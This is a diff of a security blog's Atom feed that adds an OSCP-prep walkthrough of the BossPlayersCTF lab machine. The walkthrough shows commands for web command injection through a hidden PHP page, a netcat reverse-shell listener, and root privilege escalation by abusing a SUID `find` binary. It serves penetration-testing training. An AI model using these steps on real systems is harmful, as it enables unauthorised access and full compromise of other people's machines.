@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-02-25T10:08:02+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Zwerd</title><subtitle>A stunning blog of freaking Cyber warrior</subtitle><author><name>Guy Zwerdling</name></author><entry><title type="html">The Full Methodology for OSCP Passing.</title><link href="http://localhost:4000/2024/02/18/oscp_path.html" rel="alternate" type="text/html" title="The Full Methodology for OSCP Passing." /><published>2024-02-18T00:00:00+02:00</published><updated>2024-02-18T00:00:00+02:00</updated><id>http://localhost:4000/2024/02/18/oscp_path</id><content type="html" xml:base="http://localhost:4000/2024/02/18/oscp_path.html">&lt;p&gt;In the last three weeks I have been wondering a few things, I was in a job interview at a very respectable place in my area, I was in my first interview which was technical, I was asked questions about WIRESHARK, understanding protocols such as TCP, LDAP, SMB2, how the MR system works, understanding Linux processes and how to identify SOCKETS , acquaintances with PS and even presented before a command that was very similar to what we have in OSCP, a kind of reverse shell.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-02-25T22:16:37+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Zwerd</title><subtitle>A stunning blog of freaking Cyber warrior</subtitle><author><name>Guy Zwerdling</name></author><entry><title type="html">The Full Methodology for OSCP Passing.</title><link href="http://localhost:4000/2024/02/18/oscp_path.html" rel="alternate" type="text/html" title="The Full Methodology for OSCP Passing." /><published>2024-02-18T00:00:00+02:00</published><updated>2024-02-18T00:00:00+02:00</updated><id>http://localhost:4000/2024/02/18/oscp_path</id><content type="html" xml:base="http://localhost:4000/2024/02/18/oscp_path.html">&lt;p&gt;In the last three weeks I have been wondering a few things, I was in a job interview at a very respectable place in my area, I was in my first interview which was technical, I was asked questions about WIRESHARK, understanding protocols such as TCP, LDAP, SMB2, how the MR system works, understanding Linux processes and how to identify SOCKETS , acquaintances with PS and even presented before a command that was very similar to what we have in OSCP, a kind of reverse shell.&lt;/p&gt;
 
 &lt;p&gt;The conversation was very fluid, the interview was virtual through Zoom, and two representatives came to the interview, one of whom is a team leader and the other a cyber team member, the conversation was good and ended well in which they explained to me what the process and the next step was, which is another interview with the organization’s IT manager.&lt;/p&gt;
 
@@ -32,6 +32,57 @@
 &lt;p&gt;For boxs that have only 5 points, I have done more then 40 boxs, so first we need to develop the table methodology for that case of easy machines. Let’s look on 5 machines that are easy for hack for just 5 points.&lt;/p&gt;
 
 &lt;h3 id=&quot;bossplayersctf&quot;&gt;BossPlayersCTF&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;Enumeration: run scanner to find open ports, like rustscan and found port 20 and 80 are opened, run nmap to find which service have some vulnerability, but found nothing so go against the web.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Web fuzzing: run tool for fuzzing the web like feroxbuster, gobuster, dirsearch, in my case I have used my own tool called webenum with feroxbuster but found nothing interesting, run cewl against the web found weird string, so go to the page and view source code found string in base64, decompress that string give me the following output:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└─$ echo &quot;WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK&quot; | base64 -d | base64 -d|base64 -d
+workinginprogress.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;Since we found another web page, go  against it revealed the developer made some wey to run command base on that php page, adding &lt;code class=&quot;highlighter-rouge&quot;&gt;?cmd=id&lt;/code&gt; give the output:&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└─$ curl &quot;http://192.168.xxx.20/workinginprogress.php?cmd=id&quot; | grep uid
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                              Dload  Upload   Total   Spent    Left  Speed
+100   325  100   325    0     0   2496      0 --:--:-- --:--:-- --:--:--  2500
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Shell Grabbing: since we know that with cmd variable against that php page we can run any command, we can use commix which is the easy way to get shell from provided variable point that allow to execute command, and right away we have a shell:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└─$ commix --url &quot;http://192.168.225.20/workinginprogress.php?cmd=&quot;
+...
+commix(os_shell) &amp;gt; id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+commix(os_shell) &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;Now run nc for get more comfortable shell, then run python for get the spawn of it.&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└─$ nc -nvlp 80
+listening on [any] 80 ...
+connect to [192.168.xxx.193] from (UNKNOWN) [192.168.xxx.20] 58134
+python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+www-data@bossplayers:/var/www/html$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;System enumeration: now run echo against $PATH to find all binaries file we have access and also if the machine contain some binaries that set with SUID that we can advantage, we find the &lt;code class=&quot;highlighter-rouge&quot;&gt;find&lt;/code&gt; binary file with SUID set.
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bossplayers:/var/www/html$ ls -la $(echo $PATH|tr &quot;:&quot; &quot; &quot;)|grep rws
+ls -la $(echo $PATH|tr &quot;:&quot; &quot; &quot;)|grep rws
+...
+-rwsr-sr-x  1 root root     315904 Feb 16  2019 find
+...
+www-data@bossplayers:/var/www/html$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Privilege Escalation: going to &lt;code class=&quot;highlighter-rouge&quot;&gt;https://gtfobins.github.io/&lt;/code&gt; to understand how to get root shell from the binary file we found, then found the way to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;find&lt;/code&gt; with the following to get root shell with &lt;code class=&quot;highlighter-rouge&quot;&gt;sh&lt;/code&gt;.
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bossplayers:/var/www/html$ find . -exec /bin/sh -p \; -quit
+find . -exec /bin/sh -p \; -quit
+# id
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
 
 &lt;h3 id=&quot;covfefe&quot;&gt;Covfefe&lt;/h3&gt;
 
